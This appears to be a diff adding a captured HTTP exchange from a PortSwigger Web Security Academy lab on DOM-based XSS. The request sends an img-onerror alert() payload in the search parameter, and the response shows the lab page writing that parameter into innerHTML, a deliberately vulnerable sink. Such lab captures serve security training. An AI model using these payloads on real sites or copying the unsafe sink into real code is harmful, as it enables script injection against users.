@@ -1,0 +1,96 @@
+GET https://0a4400650377471882a75b8900460050.web-security-academy.net/?search=%3Cimg+src%3D%22a%22+onerror%3Dalert%28%29%3E HTTP/1.1
+host: 0a4400650377471882a75b8900460050.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Referer: https://0a4400650377471882a75b8900460050.web-security-academy.net/?search=asd
+Cookie: session=bSsIEkxiYG50HXBKbYEOpITjsPys2hIu
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 3708
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsBlog.css rel=stylesheet>
+        <title>DOM XSS in innerHTML sink using source location.search</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h2>
+                            <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="blog">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class=blog-header>
+                        <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
+                        <script>
+                            function doSearchQuery(query) {
+                                document.getElementById('searchMessage').innerHTML = query;
+                            }
+                            var query = (new URLSearchParams(window.location.search)).get('search');
+                            if(query) {
+                                doSearchQuery(query);
+                            }
+                        </script>
+                        <hr>
+                    </section>
+                    <section class=search>
+                        <form action=/ method=GET>
+                            <input type=text placeholder='Search the blog...' name=search>
+                            <button type=submit class=button>Search</button>
+                        </form>
+                    </section>
+                    <section class="blog-list no-results">
+                        <div class=is-linkback>
+        <a href="/">Back to Blog</a>
+                        </div>
+                    </section>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
